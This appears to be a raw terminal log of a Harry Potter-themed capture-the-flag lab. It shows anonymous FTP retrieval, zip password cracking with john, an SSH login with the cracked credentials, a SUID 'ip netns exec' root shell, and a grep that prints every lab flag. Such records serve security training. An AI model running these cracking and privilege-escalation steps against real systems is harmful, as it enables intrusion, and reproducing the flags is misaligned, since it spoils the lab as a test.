@@ -1,0 +1,448 @@
+drwxr-xr-x    3 ftp      ftp          4096 Sep 06  2020 ..
+drwxr-xr-x    2 ftp      ftp          4096 Apr 27 09:04 ...
+-rw-r--r--    1 ftp      ftp           105 Sep 06  2020 GoAway.exe
+226 Directory send OK.
+ftp> get GoAway.exe
+local: GoAway.exe remote: GoAway.exe
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for GoAway.exe (105 bytes).
+226 Transfer complete.
+105 bytes received in 0.00 secs (163.5392 kB/s)
+ftp> cd ...
+250 Directory successfully changed.
+ftp> ls -la
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 ftp      ftp          4096 Apr 27 09:04 .
+drwxr-xr-x    3 ftp      ftp          4096 Sep 06  2020 ..
+-rw-r--r--    1 ftp      ftp           231 Apr 27 09:04 .I_saved_it_harry.zip
+-rw-r--r--    1 ftp      ftp           157 Sep 06  2020 note4neville
+226 Directory send OK.
+ftp> get note4neville
+local: note4neville remote: note4neville
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for note4neville (157 bytes).
+226 Transfer complete.
+157 bytes received in 0.00 secs (358.2250 kB/s)
+ftp> get .I_saved_it_harry.zip
+local: .I_saved_it_harry.zip remote: .I_saved_it_harry.zip
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for .I_saved_it_harry.zip (231 bytes).
+226 Transfer complete.
+231 bytes received in 0.00 secs (4.5896 MB/s)
+ftp> exit
+221 Goodbye.
+root@ip-10-10-153-170:~# cat note4neville 
+Hagrid: Oi Neville even I ws able to open your secret file!  Yeah now change it before someone gets in. These are troubled times, I tell ya 'roubled imes.!!
+root@ip-10-10-153-170:~# cat .I_saved_it_harry.zip 
+PK
+	\ufffdH\ufffd\\ufffd8)b-!
+boot/.passUT	\ufffd&\ufffdi\ufffd&\ufffdiux
+                          9\ufffd\ufffd\ufffd\u0693.\u048b\ufffd	S\ufffdK0o\ufffd\ufffd;\ufffd5\ufffdy\ufffdt\ufffd\u071aot "B>\ufffd\ufffdn\ufffd7\ufffd\ufffdb\ufffd\ufffdP\ufffd8)b-!PK
+	\ufffdH\ufffd\\ufffd8)b-!
+\ufffd\ufffdboot/.passUT\ufffd&\ufffdiux
+                    PKP\ufffdroot@ip-10-10-153-170:~# cat .IamHidden 
+Hagrid: You just don't understand do you? shoooooooo Go away! this is prolly a ded end!.. huh 
+root@ip-10-10-153-170:~# get GoAway.exe 
+
+Command 'get' not found, but there are 18 similar ones.
+
+root@ip-10-10-153-170:~# cat GoAway.exe 
+Hagrid: Oh no harry, y'are steell poking injections around 'ere aren't ya? Go away 'arry, me tellin' ya.
+root@ip-10-10-153-170:~# unzip .I_saved_it_harry.zip 
+Archive:  .I_saved_it_harry.zip
+[.I_saved_it_harry.zip] boot/.pass password: root@ip-10-10-153-170:~# fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt .I_saved_it_harry.zip
+
+Command 'fcrackzip' not found, but can be installed with:
+
+apt install fcrackzip
+
+root@ip-10-10-153-170:~# zip2john .I_saved_it_harry.zip > zip.hash
+ver 1.0 efh 5455 efh 7875 .I_saved_it_harry.zip/boot/.pass PKZIP Encr: 2b chk, TS_chk, cmplen=45, decmplen=33, crc=6229389F type=0
+root@ip-10-10-153-170:~# cat zip.hash 
+.I_saved_it_harry.zip/boot/.pass:$pkzip2$1*2*2*0*2d*21*6229389f*0*44*0*2d*6229*4892*39a9ffdbda932ed28b970953a34b306fbbed3b8c358c79e374b5dc9a6f1c742022423ea88e6ee43793f962bef9*$/pkzip2$:boot/.pass:.I_saved_it_harry.zip::.I_saved_it_harry.zip
+root@ip-10-10-153-170:~# john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+anime            (.I_saved_it_harry.zip/boot/.pass)
+1g 0:00:00:00 DONE (2026-04-27 10:13) 14.28g/s 58514p/s 58514c/s 58514C/s 123456..oooooo
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+root@ip-10-10-153-170:~# unzip .I_saved_it_harry.zip 
+Archive:  .I_saved_it_harry.zip
+[.I_saved_it_harry.zip] boot/.pass password: 
+ extracting: boot/.pass              
+root@ip-10-10-153-170:~# cat boot/.pass 
+neville:ocxxbwaznnkzkymq6m7tmdykvroot@ip-10-10-153-170:~# curl -s http://10.10.212.163:9736/
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Hogwart's Royal Entry</title>
+        <meta charset="UTF-8">
+
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <style>
+            *{
+                text-decoration: none;
+                box-sizing: border-box;
+                margin: 0;
+                padding: 0;
+            }
+            body{
+                background-image: url('hogwarts.jpg');
+                background-attachment: fixed;
+                background-size: cover;
+                background-position: center;
+                width: 100%;
+                height: 100%;
+            }
+            .panda-form-container{
+                width: 300px;
+                height: 420px;
+                margin: 10% auto;
+                text-align: center;
+                display: table;
+            }
+            .panda-form{
+                width: 100%;
+                padding: 10px;
+                height: 100%;
+                display: table-cell;
+                vertical-align: middle;
+                background-color: #0000006b;
+                border-radius: 5px;
+            }
+            .panda-form > article{
+                width: 100%;
+                padding-left: 10px;
+                padding-right: 10px;
+                padding-bottom: 20px;
+                font-size: 15px;
+                text-align: left;
+                font-family: sans-serif;
+                
+            }
+            .panda-form > img{
+                margin-bottom: 30px;
+            }
+            .form-text-content{
+                color: white;
+                margin-bottom: 5px;
+                margin-top: 5px;
+                padding:5px;
+            }
+            .form-txtbox{
+                padding: 10px;
+                width: 100%;
+                margin:5px;
+                border-radius: 3px;
+                border:none;
+            }
+            .btnsubmit{
+                border: none;
+                border-radius: 5px;
+                padding:10px 25px;
+                font-weight: bold;
+                font-size: 16px;
+                color: #1f1f1f;;
+                background-image: linear-gradient(#ffe300,#fbc12e);
+            }
+            .panda-form:hover{
+                animation-name: ChanngeColor;
+                animation-duration: 4s;
+                animation-iteration-count: infinite;
+            }
+            @keyframes ChanngeColor{
+                0% {background-color:#0000006b;}
+                50% {background-color: #ff00006b;}
+                100%{background-color:#0000006b;}
+            }
+            .ghost{
+                position: absolute;
+                top: 20%;
+                left: 36%;
+                animation-name: bringGhost;
+                animation-duration: 2s;
+                animation-iteration-count: infinite;
+            }
+            .ghost2{
+                position: absolute;
+                top: 43%;
+                left: 55%;
+                animation-name: bringGhost;
+                animation-duration: 2s;
+                animation-delay: 1s;
+                animation-iteration-count: infinite;
+            }
+            .ghost2 > img{
+                width: 100px;
+            }
+            .ghost > img{
+                width: 150px;
+            }
+            @keyframes bringGhost{
+                0% {padding-top:0px;}
+                50% {padding-top: 10px;}
+                100% {padding-top: 0px;}
+            }
+            @media(max-width: 500px){
+                .ghost{
+                    left: -0;
+                }
+                .ghost >img{
+                    width: 100px;
+                }
+                .ghost2{
+                    left:300px;
+                }
+            }
+        </style>
+    </head>
+    <body>
+        
+        <div class="panda-form-container">
+            <form class="panda-form" method="POST" action="login.php">
+                <img class="logo" src="mainlogo.png" width="120">
+                <article>
+                    <label for="username" class="form-text-content">Student Name:</label><br>
+                    <input type="text" placeholder="Enter your name..." name="username" required class="form-txtbox"><br>
+                    <label for="uname" class="form-text-content">Secret Spell:</label><br>
+                    <input type="password" placeholder="Enter your secret spell..." name="password" required class="form-txtbox"><br>
+                </article>
+                <button class="btnsubmit" type="submit">Swing Wand!</button>
+            </form>
+        </div>
+        <div class="ghost">
+            <img src="ghost.png">
+        </div>
+        <div class="ghost2">
+            <img src="ghost2.png">
+            <!-- Snape: Had you been in my house, I would've kicked you out for trying to get illegally in Hogwarts..
+ Dumbledore: Ah, Severus, It's not our choice to make. Minerva?
+Minerva: Oh kick them Albus, I have lost my patience.-->
+        </div>
+    </body>
+    <script>
+        
+    </script>
+</html>root@ip-10-10-153-170:~# gobuster dir -u http://10.10.212.163:9736/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.212.163:9736/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              php,txt,html
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+
+Error: the server returns a status code that matches the provided options for non existing urls. http://10.10.212.163:9736/e9d1480b-ce63-4bd5-9663-3a28371f6108 => 200 (Length: 5187). To continue please exclude the status code or the length
+root@ip-10-10-153-170:~# nc 10.10.212.163 43768
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+                           ||        
+                          /||                         / ||                         /  ||                         /   ||                         /    ||                         //   /||\   \
+                    //  // || \  \
+                   //  //  ||  \  \
+                  //  \   ||   //  \
+                 //    \  ||  //    \ 
+                //      \ || //      \
+                ===========||===========
+                           || 
+-------------------------------------------------------~~
+           -Antioch, Cadmus and Ignotus Peverell
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+    Death took a price, but I tell you for free,      
+    All the gifts that I had, I gave to these 3..
+    last sighted in hogwarts near the old tree.
+    you give me my gifts back
+    and I'll let you roam free.
+                                      --Mr.Holmes   
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                      
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+My gifts, friend. (format: Gift1 Gift2 Gift3):  
+^C
+root@ip-10-10-153-170:~# nc 10.10.212.163 43768
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+                           ||        
+                          /||                         / ||                         /  ||                         /   ||                         /    ||                         //   /||\   \
+                    //  // || \  \
+                   //  //  ||  \  \
+                  //  \   ||   //  \
+                 //    \  ||  //    \ 
+                //      \ || //      \
+                ===========||===========
+                           || 
+-------------------------------------------------------~~
+           -Antioch, Cadmus and Ignotus Peverell
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+    Death took a price, but I tell you for free,      
+    All the gifts that I had, I gave to these 3..
+    last sighted in hogwarts near the old tree.
+    you give me my gifts back
+    and I'll let you roam free.
+                                      --Mr.Holmes   
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                      
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+My gifts, friend. (format: Gift1 Gift2 Gift3):  
+Elder_Wand Resurrection_Stone Invisibility_Cloak
+Death cannot be fooled, Only fools ramble with me. Go away before I ban you from my doors for eternity.!!
+Wand Stone Cloak
+^C
+root@ip-10-10-153-170:~# nc 10.10.212.163 43768
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+                           ||        
+                          /||                         / ||                         /  ||                         /   ||                         /    ||                         //   /||\   \
+                    //  // || \  \
+                   //  //  ||  \  \
+                  //  \   ||   //  \
+                 //    \  ||  //    \ 
+                //      \ || //      \
+                ===========||===========
+                           || 
+-------------------------------------------------------~~
+           -Antioch, Cadmus and Ignotus Peverell
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+    Death took a price, but I tell you for free,      
+    All the gifts that I had, I gave to these 3..
+    last sighted in hogwarts near the old tree.
+    you give me my gifts back
+    and I'll let you roam free.
+                                      --Mr.Holmes   
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                      
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+My gifts, friend. (format: Gift1 Gift2 Gift3):  
+Wand Stone Cloak
+Death cannot be fooled, Only fools ramble with me. Go away before I ban you from my doors for eternity.!!
+^C
+root@ip-10-10-153-170:~# ssh neville@10.10.212.163 -p 9440
+The authenticity of host '[10.10.212.163]:9440 ([10.10.212.163]:9440)' can't be established.
+ECDSA key fingerprint is SHA256:u1rvnP1QzUyXiKg1ppi/47EByOPV/jvFAmivwnLnoyk.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.10.212.163]:9440' (ECDSA) to the list of known hosts.
+neville@10.10.212.163's password: 
+Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-1112-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+30 packages can be updated.
+21 updates are security updates.
+
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+neville@ip-10-10-212-163:~$ find / -perm -u=s -type f 2>/dev/null
+/etc/room_of_requirement
+/bin/mount
+/bin/fusermount
+/bin/ping
+/bin/ping6
+/bin/ip
+/bin/umount
+/bin/su
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/newuidmap
+/usr/bin/newgidmap
+/usr/bin/chfn
+/usr/bin/pkexec
+/usr/bin/at
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/9804/bin/mount
+/snap/core/9804/bin/ping
+/snap/core/9804/bin/ping6
+/snap/core/9804/bin/su
+/snap/core/9804/bin/umount
+/snap/core/9804/usr/bin/chfn
+/snap/core/9804/usr/bin/chsh
+/snap/core/9804/usr/bin/gpasswd
+/snap/core/9804/usr/bin/newgrp
+/snap/core/9804/usr/bin/passwd
+/snap/core/9804/usr/bin/sudo
+/snap/core/9804/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/9804/usr/lib/openssh/ssh-keysign
+/snap/core/9804/usr/lib/snapd/snap-confine
+/snap/core/9804/usr/sbin/pppd
+neville@ip-10-10-212-163:~$ ip netns add foo
+neville@ip-10-10-212-163:~$ ip netns exec foo /bin/sh -p
+# ls -la /etc/room_of_requirement
+---Sr-sr-x 1 root root 17126 Apr 27 09:04 /etc/room_of_requirement
+# cat /etc/room_of_requirement
+ELF>\ufffd@@x;@8
+           @@@@@@h\ufffd\ufffd@\ufffd@@@@@%%  @ @HH.>@>@h\ufffd.>@>@\ufffd\ufffd\ufffd@\ufffd@DDP\ufffdtd " "@ "@<<Q\ufffdtdR\ufffdtd.>)\ufffdfUa9\ufffds NU\ufffd G@\ufffd x-x86-64.so.2GNUl1I:\ufffd-`\u0730h"}\u0731\u0663\ufffdGNU
+                 )8"\ufffd@\ufffd@1\ufffd@libc.so.6setuidgetsputsstdinstdoutsetegidstderrseteuidexecvpsetgidsetbuf__libc_start_mainGLIBC_2.2.5_ITM_deregisterTMCloneTable__gmon\ufffd@@\ufffd@@@@ @@(@@0@@8@@@@MCloneTableu\ufffdi	g\ufffd?@\ufffd?@\ufffd?@\ufffd?@	\ufffd@@
+H@@
+   P@@
+      \ufffd\ufffdH\ufffdH\ufffd\ufffd/H\ufffd\ufffdt\ufffd\ufffdH\ufffd\ufffd\ufffd5\ufffd/\ufffd%\ufffd/@\ufffd%\ufffd/h\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd%\ufffd/h\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd%\ufffd/h\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd%\ufffd/h\ufffd\ufffd\ufffd\ufffd\ufffd%\ufffd/h\ufffd\ufffd\ufffd\ufffd\ufffd%\ufffd/h\ufffd\ufffd\ufffd\ufffd\ufffd%\ufffd/h\ufffd\ufffd\ufffd\ufffd\ufffd%\ufffd/h\ufffdp\ufffd\ufffd\ufffd\ufffd\ufffd1\ufffdI\ufffd\ufffd^H\ufffd\ufffdH\ufffd\ufffd\ufffdPTI\ufffd\ufffd@H\ufffd\ufffd\ufffd@H\ufffd\u01d6@\ufffd
+\ufffdh@@\ufffd\ufffdfD\ufffd\ufffd\ufffd\ufffd\ufffd==/uUH\ufffd\ufffd\ufffdz\ufffd\ufffd\ufffd\ufffd+/]Ð\ufffdff.\ufffd@\ufffd\ufffd\ufffdUH\ufffd\ufffdH\ufffd\ufffd H\ufffdE\ufffdH\ufffd\ufffd.\ufffdH\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdH\ufffd\ufffd.\ufffdH\ufffd\ufffd\ufffdr\ufffd\ufffd\ufffdH\ufffd\ufffd.\ufffdH\ufffd\ufffd\ufffd^\ufffd\ufffd\ufffdH\ufffd=\ufffdB\ufffd\ufffd\ufffdH\ufffd=S\ufffd6\ufffd\ufffd\ufffdH\ufffd=o\ufffd*\ufffd\ufffd\ufffdH\ufffd=\ufffd\ufffd\ufffd\ufffd\ufffdH\ufffd=\ufffd\ufffd\ufffd\ufffd\ufffdH\ufffd=\ufffd\ufffd\ufffd\ufffd\ufffdH\ufffdE\ufffdH\ufffd\u01f8\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdH9E\ufffduR\ufffd\ufffd\ufffd+\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd-\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdH\ufffd=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdÐ\ufffd\ufffdAWL\ufffd=S+AVI\ufffd\ufffdAUI\ufffd\ufffdATA\ufffd\ufffdUH\ufffd-D+SL)\ufffdH\ufffd/\ufffd\ufffd\ufffdH\ufffd\ufffdt1\ufffd\ufffdL\ufffd\ufffdL\ufffd\ufffdD\ufffd\ufffdA\ufffd\ufffdH\ufffd\ufffdH9\ufffdu\ufffdH\ufffd[]A\A]A^A_\ufffdff.\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdH\ufffdH\ufffd\ufffdAh, Looking for the diadem? I've told this to Harry already.
+Another boy asked for it, years ago.
+If you have to ask, you\u2019ll never know. If you know, you need only ask.-Helena RawenclawThe room is located on the <>seventh floor<> in the <>left corridor<> of the Hogwarts castle and has a <>hidden<> entrance opposite the tapestry depicting the attempt of Barnabas the Barmy to teach trolls ballet. The way to open the room is to walk past it thinking hard about what you need, and the door will appear.
+....
+/bin/sh<\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdX\ufffd\ufffd\ufffd\ufffdlv\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdzRx
+                                      0\ufffd\ufffd\ufffd/D0L\ufffd\ufffd\ufffd$Dx\ufffd\ufffd\ufffd\ufffdFJ
+                                                          \ufffd?\ufffd;*3$"l\ufffd\ufffd\ufffd\ufffd	A\ufffdC
+D\ufffd\ufffd\ufffd\ufffd\ufffdeF\ufffdI\ufffdE \ufffdE(\ufffdD0\ufffdH8\ufffdG@n8A0A(B BB\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd@`@
+@>>\ufffd\ufffd\ufffd@\ufffd@8@                                 @
+\ufffd
+ @@\ufffdX@\ufffd\ufffd	\ufffd\ufffd\ufffdo\ufffd@\ufffd\ufffd\ufffdo\ufffd\ufffd\ufffdop@>@6@F@V@f@v@\ufffd@\ufffd@\ufffd@GCC: (GNU) 10.1.0\ufffd@\ufffd@\ufffd@8@\ufffd@p\ufffd@\ufffd@
+X@
+  @
+\ufffd@/6h@@BG[oh@@{ \ufffd@@/@\ufffd\ufffd\ufffdX@@\ufffd \ufffd`@@\ufffd @\ufffd
+                 @\ufffd\ufffd\ufffd@\ufffdinit.cstatic-reloc.ccrtstuff.cderegister_tm_clones__do_global_dtors_auxcompleted.0__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entryroom_of_requirement.c__FRAME_END____init_array_end_DYNAMIC__init_array_start__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_csu_fini_ITM_deregisterTMCloneTablestdout@@GLIBC_2.2.5puts@@GLIBC_2.2.5stdin@@GLIBC_2.2.5_edatasetbuf@@GLIBC_2.2.5__libc_start_main@@GLIBC_2.2.5__data_start__gmon_start____dso_handle_IO_stdin_usedgets@@GLIBC_2.2.5__libc_csu_init_dl_relocate_static_pie__bss_startmainsetgid@@GLIBC_2.2.5execvp@@GLIBC_2.2.5__TMC_END___ITM_registerTMCloneTablesetuid@@GLIBC_2.2.5setegid@@GLIBC_2.2.5stderr@@GLIBC_2.2.5seteuid@@GLIBC_2.2.5.symtab.strtab.shstrtab.interp.note.gnu.build-id.note.ABI-tag.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.dynamic.got.got.plt.data.bss.comment@\ufffd#\ufffd@\ufffd$6\ufffd@\ufffd D\ufffd\ufffd\ufffdN
+\ufffd @\ufffd "@ "<\ufffd`"@`"\ufffd>@.\ufffd\ufffd?@\ufffd\ufffd@@\ufffdX@@X\ufffd@@h00 \ufffd0h0\ufffd0\ufffd@\ufffd7\ufffdo:Invisibilty cloak: m5ktp!h970#ej0@8ja4hj8l00 
+# grep -rE "THM\{|flag\{" /var /etc /opt /home /root /srv 2>/dev/null 
+Binary file /var/lib/mysql/ibdata1 matches
+Binary file /var/lib/mysql/ib_logfile0 matches
+Binary file /var/lib/mysql/basement/monsters.ibd matches
+/var/log/auth.log:Sep  6 14:14:35 ip-10-10-58-203 sudo:     root : TTY=pts/1 ; PWD=/data ; USER=root ; COMMAND=/bin/echo THM{its_wingardium_laviosaa_Ron}
+/var/log/auth.log:Sep  6 14:14:35 ip-10-10-58-203 sudo:     root : TTY=pts/1 ; PWD=/data ; USER=root ; COMMAND=/bin/echo THM{Yeah_1_swallowed_the_sn1tch.}
+/var/log/auth.log:Sep  6 14:14:35 ip-10-10-58-203 sudo:     root : TTY=pts/1 ; PWD=/data ; USER=root ; COMMAND=/bin/echo THM{I_unarm3d_dumbled0re}
+/var/log/auth.log:Sep  6 14:14:35 ip-10-10-58-203 sudo:     root : TTY=pts/1 ; PWD=/data ; USER=root ; COMMAND=/bin/echo THM{Albus_Perciva1_Wu1fric_Brian_Dumb1ed0re}
+/var/www/mymainsite/conn.php:        $FLAG = "THM{wait-for-your-letter!}";
+Binary file /var/cache/snapd/commands.db matches
+/etc/left_corridor/seventh_floor/.entrance:THM{That-boy-was-Tom-Riddle}
+/home/hermoine/special_spell.txt:THM{its_wingardium_laviosaa_Ron}
+/home/draco/achievements.txt:THM{I_unarm3d_dumbled0re}
+/home/harry/special_spell.txt:THM{Yeah_1_swallowed_the_sn1tch.}
+/root/headmaster.txt:THM{Albus_Perciva1_Wu1fric_Brian_Dumb1ed0re}
+# 
